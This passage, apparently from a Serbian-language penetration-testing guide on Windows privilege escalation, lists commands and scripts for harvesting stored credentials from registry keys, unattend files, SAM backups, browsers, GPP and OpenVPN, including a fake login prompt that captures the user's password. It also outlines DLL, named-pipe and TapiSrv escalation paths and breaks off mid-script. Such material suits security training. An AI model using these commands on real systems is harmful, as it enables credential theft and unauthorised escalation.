Na Windows serveru proverite ACL konfiguracije **servera** u njegovom instalacionom direktorijumu i svih zaštićenih rezervnih kopija. Jedna moguća lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako se razlikuje, koristite putanju konfigurisanu za servis. Potvrdite da trenutni identitet može da čita datoteku i da je `CA.private_key` zaista prisutan. Izbegavajte ispisivanje privatnog ključa u evidencijama ili izlazu enumeracije. Proizvođačev postupak `config api_client` koristi CA ključ za izdavanje klijentskog sertifikata, ali potrebna je i odgovarajuća uloga na serveru; njeno kreiranje ili menjanje može zahtevati dozvolu za upis u bazu podataka ili ponovno pokretanje. Postojeći privilegovani identitet servera može obezbediti put čak i kada takvi upisi nisu dostupni. API upiti s pravima za izvršavanje pokreću se u odgovarajućem kontekstu servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, držite CA ključ za potpisivanje van mreže kada je moguće i ograničite API uloge i pristup listenerima. Pogledajte [Velociraptor API dokumentaciju](https://docs.velociraptor.app/docs/server_automation/server_api/) i [uputstva za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban upravljač sesijama. Njegova izvorna šifrovana memorija može biti na lokaciji `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugom mestu. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i mogu da sadrže sesije, ključeve, skripte, oznake i veze; njihov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi lokaciju izvorne memorije. Najpre proverite dozvole za datoteke i putanje. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### PuTTY SSH ključevi hosta

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos unutar te putanje, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovan, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici možete pronaći ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta i želite da se automatski pokreće pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim SSH ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko SSH-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije identifikovao korišćenje `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za unattended instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM i SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) rezervne kopije mogu sadržati i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Dajte prednost lokalno dostupnim direktorijumima sa rezervnim kopijama ili slikama i pre izdvajanja proverite **nazive članova** slike; samo ime `.wim` datoteke ne dokazuje da su hive-ovi izloženi, a uobičajene `install.wim`, `boot.wim` i recovery slike često su pogrešan trag. SMB deljenje je zaseban put pristupa i treba ga proveriti samo ako je to deljenje obuhvaćeno opsegom. Pogledajte Microsoft smernice za [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu datoteka registry hive-ova](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud akreditivi

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupi računara putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao značajne bezbednosne propuste. Kao prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svakom korisniku domena. Kao drugo, lozinke unutar ovih GPP-ova, šifrovane pomoću AES256 sa javno dokumentovanim podrazumevanim ključem, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik, jer je korisnicima moglo da omogući sticanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija za pretragu lokalno keširanih GPP datoteka koje sadrže neprazno polje „cpassword“. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Dešifrovanje cPassword-a:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa podacima za prijavu:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup arhive u IIS webroot direktorijumu

Stara ZIP rezervna kopija smeštena direktno u webroot direktorijumu koji se servira može da otkrije prethodne konfiguracione datoteke i ponovo upotrebljive akreditive. Proverite konfigurisanu fizičku putanju sajta i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je moguća lokacija. Brzi lokalni pregled može da izlista nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da oporavljeni akreditiv daje viši nivo privilegija.

### OpenVPN akreditivi

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logovi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže podatke za prijavu**

Poznate datoteke koje su nekada sadržale **lozinke** u **otvorenom tekstu** ili Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Varijanta liste naziva datoteka bez ekstenzije Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Tretirajte fajl sa odgovarajućim imenom kao kandidata za šifrovani trezor; samo njegovo prisustvo ne znači da možete da ga pročitate, otključate ili koristite sačuvane akreditive. Prilikom provere gde se takvi fajlovi čuvaju, pregledajte dostupne korisničke profile i konfigurisane korene za deljenje fajlova.

Čitljiv KeePass `.kdbx` fajl takođe je samo trag koji ukazuje na šifrovani trezor. Za njegovo otključavanje potrebni su stvarna glavna lozinka i svi konfigurisani faktori, kao što su ključni fajl ili nalog. Ako se tokom ovlašćene provere u unosu pronađe par LM:NT hash vrednosti, proverite navedeni nalog i da li je NT hash aktuelan i prihvaćen od strane NTLM servisa ciljnog sistema pre razmatranja tehnike [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje prava Administrator ili SYSTEM; moraju biti ispunjeni i uslovi za udaljeni pristup servisu, prava naloga i svaki zaseban korak za izvršavanje servisa. U inventaru navedite putanju do trezora i da li je čitljiv, ali nemojte ispisivati bazu podataka ni sačuvane akreditive.

Pretražite sve predložene fajlove:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Varijanta komande za pretragu bez ekstenzije Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Akreditivi u RecycleBin-u

Takođe proverite Korpu za otpatke i potražite akreditive

Proverite dostupne unose u Korpi za otpatke zbog obrisanih rezervnih kopija i arhiva konfiguracije, kao i datoteka čiji nazivi izričito pominju akreditive. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara više meseci i imati uobičajen naziv. Windows čuva prvobitnu putanju i vreme brisanja u `$I` zapisu, a obrisanu datoteku kao upareni `$R` unos; pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje pre otvaranja arhive. Vidljivost zavisi od volumena, SID-a korisnika i dozvola za datoteke, pa prazan spisak ne dokazuje da ne postoji rezervna kopija koja se može oporaviti. Naziv arhive tretirajte kao razlog za pregled, a ne kao dokaz da sadrži važeću tajnu.

Dostupan obrisani `.pfx` može biti i trag za **code-signing**. Ako sadrži dostupan privatni ključ, tim ključem može se potpisati izmenjena PowerShell skripta; [PowerShell zahteva sertifikat za code-signing sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u proveravaju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje pod drugim nalogom zahteva da trenutni identitet može da izmeni konkretnu skriptu, da efektivno pravilo prihvata rezultatni potpis za tu skriptu i ciljni nalog i da zakazani zadatak ili drugi potrošač sa višim privilegijama zaista pokrene skriptu. Sam naziv `.pfx` datoteke, predmet sertifikata ili mogućnost pisanja u skriptu ne potvrđuju ovaj lanac. Pregledajte metapodatke, ACL-ove, smernice i zakazanu komandu pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka.

Pregledajte i dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke u potrazi za tragovima o akreditivima. Izvezena BitLocker datoteka za oporavak može biti sačuvana kao HTML ili TXT, ponekad unutar arhive rezervne kopije sa odgovarajućim nazivom. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu podataka koji sadrži starije rezervne kopije; pregledajte volumen i arhivu samo kada je pristup odobren. Ako rezervna kopija sadrži `NTDS.dit`, za oporavak akreditiva domena van mreže potreban je i odgovarajući `SYSTEM` hive, kao što je opisano u [postupku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Nazivi datoteka i zaključan volumen sami po sebi ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** sačuvanih u nekoliko programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Ostali mogući ključevi registra sa akreditivima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvojite OpenSSH ključeve iz registry-ja.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite da li postoje baze podataka u kojima se čuvaju lozinke iz **Chrome-a ili Firefox-a**.\
Trebalo bi da proverite da li postoje baze podataka u kojima se čuvaju lozinke iz **Chrome-a, Edge-a ili Firefox-a**.\
Proverite i istoriju, obeleživače i omiljene stranice pregledača, jer se možda tamo čuvaju neke **lozinke**.

Za uobičajeni profil **Default** trenutnog korisnika u Edge-u, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili smernica `UserDataDir` mogu da promene lokaciju. Samo prisustvo datoteka ukazuje na moguću lokaciju sačuvanih kredencijala: proverite da li su datoteke čitljive, da li imate odgovarajući DPAPI kontekst korisnika ili drugi odobreni materijal ključa i da li sačavljena prijava pripada nalogu sa višim privilegijama. Enumeracija samo putanja ne mora da otvara bazu podataka niti da prikazuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` profila uparenе datoteke ključa i šifrovanih prijava. Njihovo prisustvo samo ukazuje na moguću lokaciju: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li je ključ zaštićen lozinkom Primary Password pre nego što zaključite da su kredencijali upotrebljivi. Ako oporavljeni kredencijal pripada nalogu domena, zasebno proverite efektivna prava tog naloga za kontrolu grupe i [LAPS prava za čitanje ili dešifrovanje lozinke](../active-directory-methodology/laps.md); artefakti pregledača sami po sebi ne potvrđuju put do administratorskih privilegija.

Alatke za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta **identifikuje se pomoću ID-a klase (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih pomoću ID-ova interfejsa (IID).

COM klase i interfejsi definisani su u registry-ju pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**, tim redom. Ovaj registry se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registry-ja možete pronaći podređeni registry **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL** i vrednost pod nazivom **ThreadingModel**, koja može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registry-ja možete pronaći podređeni registry InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

U osnovi, ako možete da **prepišete bilo koju DLL** koja će biti izvršena, mogli biste da **eskalirate privilegije** ako tu DLL izvršava drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje pristupa, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registry-ju**

**Pretraživanje sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pretraga datoteke sa određenim nazivom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** dodatak koji sam napravio da **automatski pokrene svaki Metasploit POST modul koji traži akreditive** na žrtvi.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve datoteke koje sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alata koji čuvaju ove podatke u otvorenom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da nasleđuje sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete preuzeti **otvoreni handle do privilegovanog procesa kreiranog** pomoću `OpenProcess()` i **ubaciti shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i **ovu objavu za potpunije objašnjenje testiranja i zloupotrebe drugih otvorenih handle-ova procesa i niti koji se nasleđuju sa različitim nivoima dozvola (ne samo punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, koji se nazivaju **pipe-ovi**, omogućavaju komunikaciju i prenos podataka između procesa.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. To je slično arhitekturi klijent/server, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je podesio pipe može **preuzeti identitet** **klijenta**, pod uslovom da ima potrebna prava **SeImpersonate**. Pronalaženje **privilegovanog procesa** koji komunicira putem pipe-a koji možete oponašati pruža priliku za **sticanje viših privilegija** preuzimanjem identiteta tog procesa nakon što stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje takvog napada potražite [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Sledeći alat omogućava **presretanje komunikacije putem named pipe-a pomoću alata poput Burp-a:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv: udaljeni DWORD upis do RCE-a

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može zloupotrebiti asinhronu putanju događaja zasnovanu na mailslot-u da bi pretvorio `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobio administratorska prava za Telephony i učitao proizvoljan DLL kao servis. Kompletan tok:

- Pozovite `ClientAttach` tako da `pszDomainUser` bude podešen na postojeću putanju u koju je moguće upisivati → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhrone upise događaja.
- Svaki događaj upisuje napadačev `InitContext` iz `Initialize` u taj handle. Registrujte line aplikaciju pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite podatke pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim je odregistrujte/isključite da biste ponovili determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa putanjom proizvoljnog DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a putem Markdown renderera

Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke koje kontroliše napadač kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditivne podatke komandnoj liniji**. Skripta ispod prikuplja komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, ispisujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
